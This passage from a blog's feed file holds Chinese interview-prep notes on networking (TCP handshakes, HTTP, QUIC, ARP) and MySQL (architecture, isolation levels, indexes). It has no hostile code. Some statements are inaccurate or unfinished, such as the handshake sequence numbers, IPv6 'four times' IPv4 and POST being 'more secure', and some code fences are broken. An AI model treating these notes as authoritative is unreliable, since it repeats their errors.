只要某个流中的数据包丢失了，其他流也会因此受影响。</li></ul></li><li>更快的连接建立：quic协议握手的方式：<ul><li>QUIC 内部包含了 TLS，它在自己的帧会携带 TLS 里的“记录”，再加上 QUIC 使用的是 TLS 1.3，因此仅需 1 个 RTT 就可以「同时」完成建立连接与密钥协商，甚至在第二次连接的时候，应用数据包可以和 QUIC 握手信息（连接信息 + TLS 信息）一起发送，达到 0-RTT 的效果。</li></ul></li><li>连接迁移：没有用四元组的方式来“绑定”连接，而是通过连接 ID 来标记通信的两个端点，客户端和服务器可以各自选择一组 ID 来标记自己，因此即使移动设备的网络变化后，导致 IP 地址变化了，只要仍保有上下文信息（比如连接 ID、TLS 密钥等），就可以“无缝”地复用原连接，消除重连的成本，没有丝毫卡顿感。</li></ol><h2 id="网页解析HTTP请求："><a href="#网页解析HTTP请求：" class="headerlink" title="网页解析HTTP请求："></a>网页解析HTTP请求：</h2><ol><li><p>输入url</p></li><li><p>DNS解析，就近原则，如果本地DNS服务器的缓存中没有，就发到DNS根服务器，</p><ul><li>根DNS服务器返回的报文，告诉本地DNS，这个域名由哪个顶级DNS服务器负责，本地去这个顶级（比如.com）服务器去查询</li><li>顶级返回次级地址，次级返回次次级，最后返回目标IP，本地DNS缓存更新这个IP</li><li>其中用户使用的DNS服务器默认是运营商提供的本地域名解析器，检查自己的缓存</li></ul></li><li><p><strong>建立TCP连接，经过三次握手 <em>1.C-&gt;S发送握手请求，附带一个SEQ=x，2.S-&gt;C发送收到，福袋一个ACK=x+1，和另一个SEQ=y ，3. C-&gt;S发送一个ACK=y+1 ,SEQ =x+1，上一个ACK</em>，结束SYN-RECV阶段，并进入establish阶段/</strong></p></li><li><p>释放连接，<strong>经过四次挥手</strong> <em>1.</em></p><h2 id="网页解析HTTPS请求：先建立TCP，再建立SSL加密"><a href="#网页解析HTTPS请求：先建立TCP，再建立SSL加密" class="headerlink" title="网页解析HTTPS请求：先建立TCP，再建立SSL加密"></a>网页解析HTTPS请求：先建立TCP，再建立SSL加密</h2></li><li><p>输入url，三次握手完成TCP通信建立</p></li><li><p>客户端发送https请求到服务端</p></li><li><p>服务端发回SSL证书和公钥到客户端</p></li><li><p>客户端验证证书安全性，如果安全，生成对称密钥，把这个密钥用公钥发回服务端</p></li><li><p>服务端用自己的私钥解密，这样两者都有了session key，后面的传输都是通过这个对称加密进行的</p></li></ol><h2 id="HTTP1-1的长连接是怎样建立的"><a href="#HTTP1-1的长连接是怎样建立的" class="headerlink" title="HTTP1.1的长连接是怎样建立的"></a>HTTP1.1的长连接是怎样建立的</h2><p>响应头中包含了 Connection: keep-alive 字段，那么它表示愿意保持连接开启，后续的请求都会通过上一个连接发送</p><h2 id="HTTP方法：POST-GET的区别：get提交数据在url后，post在body中；get具有幂等性，post不具有"><a href="#HTTP方法：POST-GET的区别：get提交数据在url后，post在body中；get具有幂等性，post不具有" class="headerlink" title="HTTP方法：POST GET的区别：get提交数据在url后，post在body中；get具有幂等性，post不具有"></a>HTTP方法：POST GET的区别：get提交数据在url后，post在body中；get具有幂等性，post不具有</h2><p>GET 方法具有<strong>幂等性</strong>，指同样的请求被执行一次与连续执行多次的效果是一样的，服务器的状态也是一样的。换句话说就是，幂等方法不应该具有副作用（统计用途除外）。<br>POST不具有幂等性。</p><ol><li><p>get 提交的数据会放在 url 之后，post 提交的数据放在 body 上。<br>get请求参数会以 url 的形式完整的保留在浏览器的记录里，会存在安全问题。而 post 数据放在请求主体中，且数据不会被浏览器记录，相比 get 方法，post 方法更安全，主要用于修改服务器上的资源。</p><ul><li><p>post 可以进行复杂的加密，get 则不可以</p></li><li><p>get 只支持 ASCII 字符格式的参数，而 post 方法没有限制。</p></li><li><p>get 提交的数据大小有限制（这里所说的限制是针对浏览器而言的），而 post 方法提交的数据理论上没限制</p></li></ul></li><li><p>get 方法具有幂等性，post 方法不具有。<br>幂等性，同样的请求被执行一次与连续执行多次的效果是一样的，服务器的状态也是一样的。换句话说就是，幂等方法不应该具有副作用（统计用途除外）。</p></li><li><p>post方法有时会发送两个 tcp 数据包，与浏览器有关</p></li></ol><ul><li>使用 XMLHttpRequest 的 POST 方法时，浏览器会先发送 Header 再发送 Data。但并不是所有浏览器会这么做，例如火狐就不会。</li><li>而 GET 方法 Header 和 Data 会一起发送<br>XMLHttpRequest 是一个 API，它为客户端提供了在客户端和服务器之间传输数据的功能。它提供了一个通过 URL 来获取数据的简单方式，并且不会使整个页面刷新。这使得网页只更新一部分页面而不会打扰到用户。XMLHttpRequest 在 AJAX 中被大量使用。</li></ul><h2 id="长连接：减少-TCP-连接的重复建立和断开所造成的额外开销，减轻服务器端的负载。"><a href="#长连接：减少-TCP-连接的重复建立和断开所造成的额外开销，减轻服务器端的负载。" class="headerlink" title="长连接：减少 TCP 连接的重复建立和断开所造成的额外开销，减轻服务器端的负载。"></a>长连接：减少 TCP 连接的重复建立和断开所造成的额外开销，减轻服务器端的负载。</h2><ul><li>管道传输【一般不使用】：在同一个 TCP 连接里面，客户端可以发起多个请求：只要第一个请求发出去了，不必等其回来，就可以发第二个请求出去，可以减少整体的响应时间</li><li>队头阻塞问题：当顺序发送的请求序列中的某个请求阻塞时，后面的请求也会一直被阻塞。<h1 id="2-传输层"><a href="#2-传输层" class="headerlink" title="2. 传输层"></a>2. 传输层</h1><h2 id="UDP"><a href="#UDP" class="headerlink" title="UDP"></a>UDP</h2>UDP头部包含8个字节64位</li></ul><p>UDP头部的格式如下：</p><p><strong>源端口 (16位)</strong>：用于标识发送方的端口号。<br><strong>目标端口 (16位)</strong>：用于标识接收方的端口号。<br><strong>长度 (16位)</strong>：指示UDP报文头部和数据的总长度，以字节为单位，最小值为8（只有头部）。<br><strong>校验和 (16位)</strong>：用于检测UDP报文是否在传输过程中发生了错误。</p><h2 id="TCP"><a href="#TCP" class="headerlink" title="TCP"></a>TCP</h2><p>TCP头部包含20个字节。握手挥手时，数据字段为空</p><h3 id="为什么要进行三次握手-？"><a href="#为什么要进行三次握手-？" class="headerlink" title="*为什么要进行三次握手 ？"></a>*为什么要进行三次握手 ？</h3><p>确认客户端和服务端都可以正常发送接收数据。</p><ul><li>第一次握手：确认客户端可以正常发送数据。</li><li>第二次握手：确认客户端可以正常发送数据，确认服务端可以正常接收数据。</li><li>第三次握手：确认客户端可以正常发送数据，确认服务端可以正常接收数据，确认服务端可以正常发送数据，客户端可以正常接收数据。<h3 id="三次握手过程中网络断开，会出现什么情况"><a href="#三次握手过程中网络断开，会出现什么情况" class="headerlink" title="三次握手过程中网络断开，会出现什么情况"></a>三次握手过程中网络断开，会出现什么情况</h3></li></ul><p>第一次握手丢失：客户端没收到第二次握手，触发超时重传机制，发送第一次握手<br>第二次握手丢失：客户端依然没收到第二次握手，触发超时重传，发送第一次握手；服务端没有收到第三次握手，超时重传，发送第二次握手<br>第三次握手丢失：客户端establish状态，服务端没有收到第三次握手，超时重传，仍然发送第二次握手</p><p>超时重传的限度：发送一定次数N，这个次数由内核限制，linux为5次。</p><h3 id="为什么要进行四次挥手-？"><a href="#为什么要进行四次挥手-？" class="headerlink" title="为什么要进行四次挥手 ？"></a>为什么要进行四次挥手 ？</h3><p>第一次挥手：客户端向服务端请求关闭连接。</p><ul><li>客户端：客户端无数据传输。</li><li>服务端：无感知。</li></ul><p>第二次挥手：服务端收到客户端的请求，并且告知客户端等我处理完毕数据。</p><ul><li>客户端：客户端无数据传输。</li><li>服务端：客户端无数据传输。</li></ul><p>第三次挥手：服务端处理完毕数据，告知客户端，服务端数据处理完毕。</p><ul><li>客户端：客户端无数据传输，服务端无数据传输。</li><li>服务端：客户端无数据传输，服务端无数据传输。</li></ul><p>第四次挥手：客户端得知服务端数据处理完毕，双方数据都处理完毕，可断开连接。</p><ul><li>客户端：客户端无数据传输，服务端无数据传输。</li><li>服务端：客户端无数据传输，服务端无数据传输，得知客户端知道服务端无数据传输。</li></ul><h3 id="TCP是如何保证可靠传输的"><a href="#TCP是如何保证可靠传输的" class="headerlink" title="*TCP是如何保证可靠传输的"></a>*TCP是如何保证可靠传输的</h3><p>1 数据分块<br>​ 应用数据被分割成 TCP 认为最适合发送的数据块。并且给每一个数据块进行编号，在传输的过程中，每次接收方收到数据后，都会对传输方进行确认应答，即发送 ACK 报文，这个 ACK 报文当中带有对应的确认序列号，如果发送过程中，存在数据块丢失或者发送重复，接收方根据序列号整理数据块，删除重复的数据块，要求发送方重新发送丢失的数据块。</p><p>2 校验和<br>与UDP 校验和相同，监测数据传输过程中可能出现的差错。</p><p>3 流量控制<br>让发送方的发送速率不要太快，让接收方来得及接收，TCP 连接的双方都有一个固定大小的缓冲空间，发送方发送的数据量不能超过接收端缓冲区的大小。当接收方来不及处理发送方的数据，会提示发送方降低发送的速率，防止产生丢包。TCP 通过滑动窗口协议来支持流量控制机制。</p><p>4 ARQ协议<br>ARQ(Automatic Repeat-reQuest)自动重传协议：每发完一个分组就停止发送，等待对方确认。在收到确认后再发下一个分组。</p><p>5 超时重传<br>当 TCP 发出一个报文段后，它启动一个定时器，等待目的端确认收到这个报文段。如果超过某个时间还没有收到确认，将重发这个报文段。</p><p>6 拥塞控制<br>在实际的网络通信系统中，除了发送方和接收方外，还有路由器，交换机等复杂的网络传输线路，此时就需要拥塞控制。拥塞控制是作用于网络的，它是防止过多的数据注入到网络中，避免出现网络负载过大的情况。常用的解决方法有：慢开始和拥塞避免、快重传和快恢复。</p><p>慢开始：当发送方开始发送数据时，由于一开始不知道网络负荷情况，如果立即将大量的数据字节传输到网络中，那么就有可能引起网络拥塞。一个较好的方法是在一开始发送少量的数据先探测一下网络状况。慢开始的慢指的是初始发送报文段的数量为 1，如果收到确认，则发送两个报文段，之后每收到一个确认报文，发送报文端的数量就翻倍，直到到达慢开始门限，当发送报文段的数据大于门限数量时，使用拥塞避免算法。<br>拥塞避免：当网络拥塞发生时，慢开始门限值减半，发送的报文段数量改变为 1 ,然后再次重复两种算法（慢开始和拥塞避免）。<br>快重传：接收方每收到一个失序的报文就立即发送重复确认，而不要等到自己发送数据时才捎带进行确认，假定发送方发送了 Msg 1 ~ Msg 4 这 4 个报文，已知接收方收到了 Msg 1，Msg 3 和 Msg 4 报文，此时因为接收到收到了失序的数据包，按照快重传的约定，接收方应立即向发送方发送 Msg 1 的重复确认。 于是在接收方收到 Msg 4 报文的时候，向发送方发送的仍然是 Msg 1 的重复确认。这样，发送方就收到了 3 次 Msg 1 的重复确认，于是立即重传对方未收到的 Msg 报文。由于发送方尽早重传未被确认的报文段，因此，快重传算法可以提高网络的吞吐量。</p><p>快恢复</p><p>快恢复算法是和快重传算法配合使用的，该算法主要有以下两个要点：</p><p>① 当发送方连续收到三个重复确认，执行乘法减小，慢开始门限值减半；</p><p>② 由于发送方可能认为网络现在没有拥塞，因此与慢开始不同，发送报文段的数量减半，然后执行拥塞避免算法，线性增加发送报文段的数量。</p><h2 id="quic协议-1"><a href="#quic协议-1" class="headerlink" title="quic协议"></a>quic协议</h2><p>QUIC(Quick UDP Internet Connections)，是一种基于 UDP 的传输层协议。QUIC = HTTP/2 + TLS + UDP.</p><h1 id="3-网络层"><a href="#3-网络层" class="headerlink" title="3. 网络层"></a>3. 网络层</h1><h2 id="IP"><a href="#IP" class="headerlink" title="IP"></a>IP</h2><p>A 类地址：10.0.0.0～10.255.255.255<br>B 类地址：172.16.0.0～172.31.255.255<br>C 类地址：192.168.0.0～192.168.255.255<br>解决IPv4不够用的两种技术：</p><ul><li>nat(network address translation)网络地址转换协议：将内网地址转为公网ip的协议，实现多层网络地址转换。</li><li>IPv6 128位，比IPv4的32位多了四倍<h1 id="链路层"><a href="#链路层" class="headerlink" title="链路层"></a>链路层</h1><h2 id="ARP协议"><a href="#ARP协议" class="headerlink" title="ARP协议"></a>ARP协议</h2>arp(address resolution protocol) 地址解析协议：根据主机的ip 地址获取主机的mac 地址。每个主机都有一个 ARP 高速缓存，里面有本局域网上的各主机和路由器的 IP 地址到 MAC 地址的映射表。</li></ul><p>A要发送B一个数据包，首先他有B的IP地址，为了发送成功还需要B的MAC地址。</p><ul><li>首先A查找本地ARP缓存，<strong>IP：MAC的映射</strong></li><li>如果找到MAC 地址，就可以发送消息。</li><li>如果没有，A就会发送一个局域网广播的ARP请求B的MAC的数据包，这个消息被局域网内所有的计算机接受，B返回一个包含自身MAC和IP地址的ARP响应消息。作为响应请求的一部分，B 可以将 A 的一个条目插入到它的 ARP 表中，以备将来使用。</li></ul><h2 id="MAC地址"><a href="#MAC地址" class="headerlink" title="MAC地址"></a>MAC地址</h2><ul><li>MAC 地址是数据链路层和物理层使用的地址，是写在网卡上的物理地址。MAC 地址用来定义网络设备的位置。</li><li>IP 地址是网络层和以上各层使用的地址，是一种逻辑地址。IP 地址用来区别网络上的计算机。<br>互联网中主机之间相互传递数据的逻辑是，先通过 ip 地址找到对应的局域网，然后再找到对应的主机。</li><li>如果只采用 ip 地址，不用mac 地址：不安全， 同一个ip 地址可能绑定多个主机，而无论何时mac 地址和主机是一一对应的。<br>  <strong>找不到主机号，IP本质上相当于逻辑地址，两个主机可能有一个IP</strong></li><li>如果只采用mac 地址，不用ip 地址：没有办法使用ip 通过网段寻找目标主机，需要在全网段内没有规律的找一个主机，效率太慢。<br>  <strong>一个是不够用，二是没有IP网段，全网查找，没有规律</strong></li></ul><h1 id="WebSocket"><a href="#WebSocket" class="headerlink" title="WebSocket"></a>WebSocket</h1><ul><li>使用最广泛的HTTP/1.1，也是基于TCP协议的，同一时间里，客户端和服务器只能有一方主动发数据，这就是所谓的半双工。</li><li></li></ul>]]></content>
      
      
      <categories>
          
          <category> Network </category>
          
      </categories>
      
      
        <tags>
            
            <tag> network </tag>
            
            <tag> 面试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySQL</title>
      <link href="/2023/01/03/2023-01-03-%E9%9D%A2%E7%BB%8FMySQL/"/>
      <url>/2023/01/03/2023-01-03-%E9%9D%A2%E7%BB%8FMySQL/</url>
      
        <content type="html"><![CDATA[<p> questions</p><a id="more"></a><h1 id="mysql分为哪些层，各用来干嘛的"><a href="#mysql分为哪些层，各用来干嘛的" class="headerlink" title="mysql分为哪些层，各用来干嘛的"></a>mysql分为哪些层，各用来干嘛的</h1><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/images/mysql查询流程.png.webp" alt title>                </div>                <div class="image-caption"></div>            </figure><ul><li>mysql架构共分为两层：Server 层和存储引擎层</li><li>Server 层负责建立连接、分析和执行 SQL</li><li>存储引擎层负责数据的存储和提取<h2 id="mysql基于什么协议传输"><a href="#mysql基于什么协议传输" class="headerlink" title="mysql基于什么协议传输"></a>mysql基于什么协议传输</h2>TCP。<br>三次握手建立后，连接器验证用户名和密码。</li></ul><p><strong>连接器作用</strong></p><ul><li>TCP三次握手</li><li>校检用户名密码，返回用户权限</li></ul><p><strong>查询缓存作用</strong></p><ul><li>select语句输入，执行，先去查询缓存中找，查询缓存中存的是之前执行过的sql语句，以key-value保存的，底层数据结构为哈希表。</li><li>8.0.3后移除了这一层，在一些问题，包括性能问题、锁的竞争问题以及难以扩展。</li></ul><p><strong>解析器作用</strong></p><ul><li><code>词法分析-语法分析-语法树</code>结构</li><li>词法分析（Lexical Analysis）</li><li>语法分析（Syntax Analysis）语法分析器会将其转化为一个抽象语法树（<strong>AST</strong>）</li><li><strong>AST</strong>的作用：编译器或解释器用来理解代码含义的数据结构，它可以被后续的步骤用来进行语义分析、优化和生成目标代码等。</li><li>【查询优化】：对AST进行查询优化，选择合适的索引和决定连接顺序</li></ul><h2 id="【面试题】执行一条-SQL-查询语句，期间发生了什么？"><a href="#【面试题】执行一条-SQL-查询语句，期间发生了什么？" class="headerlink" title="【面试题】执行一条 SQL 查询语句，期间发生了什么？"></a>【面试题】执行一条 SQL 查询语句，期间发生了什么？</h2><ul><li>连接器：建立连接，管理连接、校验用户身份；</li><li>查询缓存：查询语句如果命中查询缓存则直接返回，否则继续往下执行。MySQL 8.0 已删除该模块；</li><li>解析 SQL，通过解析器对 SQL 查询语句进行词法分析、语法分析，然后构建语法树，方便后续模块读取表名、字段、语句类型；</li><li>执行 SQL：执行 SQL 共有三个阶段：</li><li>prepare 预处理阶段：检查表或字段是否存在；将 select * 中的 * 符号扩展为表上的所有列。</li><li>optimize 优化阶段：基于查询成本的考虑， 选择查询成本最小的执行计划；</li><li>execute 执行阶段：根据执行计划执行 SQL 查询语句，从存储引擎读取记录，返回给客户端；</li></ul><h2 id="如何查看我的sql被几个客户端链接了"><a href="#如何查看我的sql被几个客户端链接了" class="headerlink" title="如何查看我的sql被几个客户端链接了"></a>如何查看我的sql被几个客户端链接了</h2><p>show processlist;会有ID user host等字段</p><h2 id="mysql推荐使用长链接，但会产生的问题："><a href="#mysql推荐使用长链接，但会产生的问题：" class="headerlink" title="mysql推荐使用长链接，但会产生的问题："></a>mysql推荐使用长链接，但会产生的问题：</h2><p>随着长连接一直不释放，内存占用大。【解决方式】定期释放，主动重置连接mysql_reset_connection()</p><h2 id="MYSQL的数据存储方式"><a href="#MYSQL的数据存储方式" class="headerlink" title="MYSQL的数据存储方式"></a>MYSQL的数据存储方式</h2><ol><li>show variable like ‘datadir’; 可以查找mysql的文件在哪<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">db.opt  用来存储当前数据库的默认字符集和字符校验规则。</span><br><span class="line">t_order.frm  存放表结构，在 MySQL 中建立一张表都会生成一个.frm 文件，该文件是用来保存每个表的元数据信息的，主要包含表结构定义。</span><br><span class="line">t_order.ibd  存放表数据。表数据既可以存在共享表空间文件（文件名：ibdata1）里，也可以存放在独占表空间文件（文件名：表名字.ibd）。</span><br></pre></td></tr></table></figure></li></ol><h3 id="表空间文件的结构"><a href="#表空间文件的结构" class="headerlink" title="表空间文件的结构"></a>表空间文件的结构</h3><p>表空间由段（segment）、区（extent）、页（page）、行（row）组成</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/images/mysqltablestructure.drawio.webp" alt title>                </div>                <div class="image-caption"></div>            </figure><ul><li>表中的数据在Page里，数据是按「页」为单位来读写的，当需要读一条记录的时候，并不是将这个行记录从磁盘读出来，而是以页为单位，将其整体读入内存。</li><li>默认每个页的大小为 16KB，也就是最多能保证 16KB 的连续存储空间</li></ul><p><strong>按区分配空间的情况</strong></p><ul><li>在表中数据量大的时候，为某个索引分配空间的时候就不再按照页为单位分配了，而是按照区（extent）为单位分配。每个区的大小为 1MB，对于 16KB 的页来说，连续的 64 个页会被划为一个区，这样就使得链表中相邻的页的物理位置也相邻，就能使用顺序 I/O 了。</li></ul><p><strong>段一般分为数据段、索引段和回滚段等。</strong></p><ul><li>索引段：存放 B + 树的非叶子节点的区的集合；</li><li>数据段：存放 B + 树的叶子节点的区的集合；</li><li>回滚段：存放的是回滚数据的区的集合，之前讲事务隔离 (opens new window)的时候就介绍到了 MVCC 利用了回滚段实现了多版本查询数据。<h2 id="Innodb的行格式"><a href="#Innodb的行格式" class="headerlink" title="Innodb的行格式"></a>Innodb的行格式</h2>InnoDB 提供了 4 种行格式，分别是 Redundant、Compact、Dynamic和 Compressed 行格式。</li></ul><p><strong>COMPACT 行格式</strong></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/images/COMPACT.drawio.png.webp" alt title>                </div>                <div class="image-caption"></div>            </figure><ul><li><p>数据类型：char 是定长的，varchar 是变长的，变长字段实际存储的数据的长度（大小）不固定的。</p></li><li><p>row_id：<br>如果我们建表的时候指定了主键或者唯一约束列，那么就没有 row_id 隐藏字段了。如果既没有指定主键，又没有唯一约束，那么 InnoDB 就会为记录添加 row_id 隐藏字段。row_id不是必需的，占用 6 个字节。</p></li><li><p>trx_id：<br>事务id，表示这个数据是由哪个事务生成的。 trx_id是必需的，占用 6 个字节。</p></li><li><p>roll_pointer：<br>这条记录上一个版本的指针。roll_pointer 是必需的，占用 7 个字节</p></li><li><p>NULL值列表：用位图存储的。压缩行存储通过一种称为”Dynamic Prefix”的技术，动态地存储每一行的前缀信息和 NULL 列的位图。这使得它可以更加高效地存储具有大量 NULL 列的行。</p><h1 id="mysql读取时的几个情况"><a href="#mysql读取时的几个情况" class="headerlink" title="mysql读取时的几个情况"></a>mysql读取时的几个情况</h1></li><li><p>脏读：读到其他事务未提交的数据；</p></li><li><p>不可重复读：前后读取的数据不一致；</p></li><li><p>幻读：前后读取的记录数量不一致。</p></li></ul><p><strong>脏读</strong>: A事务读取到了B事务未提交的内容,而B事务后面进行了回滚. </p><p><strong>不可重复读</strong>: 当设置A事务只能读取B事务已经提交的部分,会造成在A事务内的两次查询,结果竟然不一样,因为在此期间B事务进行了提交操作. </p><p><strong>幻读</strong>: A事务读取了一个范围的内容,而同时B事务在此期间插入了一条数据.造成”幻觉”. </p><h1 id="MySQL什么情况下索引会失效"><a href="#MySQL什么情况下索引会失效" class="headerlink" title="MySQL什么情况下索引会失效"></a>MySQL什么情况下索引会失效</h1><ol><li>组合索引时，如果查询条件没有使用最左边的字段，就不会使用索引</li><li>like进行匹配时，如果字符串前面含有%百分号，就会全表扫描时，不使用索引，</li><li>还有一种情况，是如果查询条件中类型是字符串，没有引号，发生了隐式转换就不会使用索引</li><li>对索引列进行运算</li><li>判断索引列是否不等于某个值时</li><li>查询条件使用or连接，也会导致索引失效</li></ol><h1 id="mysql四种隔离级别"><a href="#mysql四种隔离级别" class="headerlink" title="mysql四种隔离级别"></a>mysql四种隔离级别</h1><ol><li>Serializable (串行化) :可避免脏读、不可重复读、幻读的发生。 </li><li>Repeatable read (可重复读) :可避免脏读、不可重复读的发生。 </li><li>Read committed (读已提交) :可避免脏读的发生。</li><li>Read uncommitted (读未提交) :最低级别，任何情况都无法保证。 </li></ol><p>SQL查看隔离级别：</p><figure class="highlight plain"><figcaption><span>@@transaction_isolation;```</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">设置隔离级别：</span><br><span class="line">```set session transaction isolation level read uncommitted;</span><br></pre></td></tr></table></figure><h2 id="生产环境数据库一般用的什么隔离级别呢？"><a href="#生产环境数据库一般用的什么隔离级别呢？" class="headerlink" title="生产环境数据库一般用的什么隔离级别呢？"></a>生产环境数据库一般用的什么隔离级别呢？</h2><p>生产环境大多使用RC(读已提交)，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">缘由一：在可重复读RR隔离级别下，存在**间隙锁**，导致出现死锁的几率比RC大的多！ </span><br><span class="line">缘由二：在RR隔离级别下，条件列未命中索引会锁表！而在RC隔离级别下，只锁行!</span><br></pre></td></tr></table></figure><p>InnoDB的默认隔离级别：可重复读，不能避免幻读<br>多版本并发控制协议MVCC(Multi- Version Concurrency Control) </p><h1 id="索引"><a href="#索引" class="headerlink" title="索引"></a>索引</h1><h2 id="什么是索引"><a href="#什么是索引" class="headerlink" title="什么是索引"></a>什么是索引</h2><p>索引是存储引擎用于提高数据库表的访问速度的一种数据结构。它可以比作一本字典的目录，可以帮你快速找到对应的记录。<br>索引一般存储在磁盘的文件中，它是占用物理空间的。</p><h2 id="索引的分类（按字段特性）"><a href="#索引的分类（按字段特性）" class="headerlink" title="索引的分类（按字段特性）"></a>索引的分类（按字段特性）</h2><ol><li>主键索引：primary key，在创建表的时候一起创建，一张表最多只有一个主键索引，索引列的值不允许有空值。<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> A(</span><br><span class="line">    x <span class="built_in">int</span> primary <span class="keyword">key</span>, </span><br><span class="line">    //或</span><br><span class="line">    x <span class="built_in">int</span>,</span><br><span class="line">    primary <span class="keyword">key</span>(x) <span class="keyword">using</span> BTREE</span><br><span class="line">);</span><br></pre></td></tr></table></figure></li></ol><p>建表后，创建主键索引<br><code>CREATE INDEX a ON tableA(a);</code><br>再将其添加主键约束<br><code>ALTER TABLE tableA ADD CONTRAINT id PRIMARY KEY</code></p><p>如果仅改一个主键<code>ALTER TABLE tableA ADD PRIMARY KEY(a)</code></p><ol start="2"><li>唯一索引：unique key建立在 UNIQUE 字段上的索引，一张表可以有多个唯一索引，<strong>索引列的值必须唯一，但是允许有空值</strong>。<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> A&#123;</span><br><span class="line">    x <span class="built_in">int</span> <span class="keyword">unique</span> <span class="keyword">key</span>,</span><br><span class="line">    <span class="keyword">unique</span> <span class="keyword">key</span>(x)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><ul><li>建表后，创建唯一索引<code>create UNIQUE INDEX index_nameON table_name(index_column_1,index_column_2,...);</code></li></ul><ol start="3"><li><p>普通索引/二级索引:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">INDEX</span> idx <span class="keyword">on</span> tableA(a,b,x,y);</span><br></pre></td></tr></table></figure></li><li><p>前缀索引: 对字符类型字段的前几个字符建立的索引，而不是在整个字段上建立的索引</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> tableA(</span><br><span class="line">    a <span class="built_in">varchar</span>(<span class="number">255</span>),</span><br><span class="line">    <span class="keyword">INDEX</span>(a(<span class="number">10</span>))//字符串前<span class="number">10</span>个字符匹配。</span><br><span class="line">);</span><br></pre></td></tr></table></figure></li></ol><h3 id="【面试考点】联合索引如何使用的"><a href="#【面试考点】联合索引如何使用的" class="headerlink" title="【面试考点】联合索引如何使用的"></a>【面试考点】联合索引如何使用的</h3><ol><li>联合索引范围查询</li></ol><p>联合索引的最左匹配原则会一直向右匹配直到遇到「范围查询」就会停止匹配。也就是范围查询的字段可以用到联合索引，但是在范围查询字段的后面的字段无法用到联合索引。</p><p>【例子】</p><figure class="highlight plain"><figcaption><span>* from  tableA where a> 10 and b</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">```select * from  tableA where a&gt;= 10 and b=2;```的区别：</span><br><span class="line">a都用了索引，一个没用，一个用了。因为对于联合索引，是先按照 a 字段的值排序，然后在 a 字段的值相同的情况下，再按照 b 字段的值进行排序</span><br><span class="line">   </span><br><span class="line">## 索引的优缺点？</span><br><span class="line"></span><br><span class="line">优点：</span><br><span class="line">- 加快数据查找的速度</span><br><span class="line">- 为用来排序或者是分组的字段添加索引，可以加快分组和排序的速度</span><br><span class="line">- 加快表与表之间的连接</span><br><span class="line"></span><br><span class="line">缺点：</span><br><span class="line">- 建立索引需要占用物理空间</span><br><span class="line">- 会降低表的增删改的效率，因为每次对表记录进行增删改，需要进行动态维护索引，导致增删改时间变长</span><br><span class="line">## 什么情况下需要建索引？</span><br><span class="line"></span><br><span class="line">- 经常**用于查询**的字段</span><br><span class="line">- 经常**用于连接**的字段建立索引，可以加快连接的速度</span><br><span class="line">- 经常**需要排序**的字段建立索引，因为索引已经排好序，可以加快排序查询速度</span><br><span class="line"></span><br><span class="line">## 什么情况下不建索引？</span><br><span class="line"></span><br><span class="line">- where条件中用不到的字段不适合建立索引</span><br><span class="line">- 表记录较少。比如只有几百条数据，没必要加索引。</span><br><span class="line">- 需要经常增删改。需要评估是否适合加索引</span><br><span class="line">- 参与列计算的列不适合建索引</span><br><span class="line">- 区分度不高的字段不适合建立索引，如性别，只有男/女/未知三个值。加了索引，查询效率也不会提高。</span><br><span class="line"></span><br><span class="line">## 哈希索引</span><br><span class="line">哈希索引是基于哈希表实现的，对于每一行数据，存储引擎会对索引列进行哈希计算得到哈希码，并且哈希算法要尽量保证不同的列值计算出的哈希码值是不同的，将哈希码的值作为哈希表的key值，将指向数据行的指针作为哈希表的value值。这样查找一个数据的时间复杂度就是O(1)，一般多用于精确查找。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## 【面试题】InnoDB为什么用B+树做索引</span><br><span class="line">从数据结构和考虑磁盘 I/O 操作次数回答</span><br><span class="line">![](/images/innodbb%2Btree.webp)</span><br><span class="line">因为B+树可以实现**有序存放**和**减少磁盘IO**</span><br><span class="line">知识点：</span><br><span class="line">1. 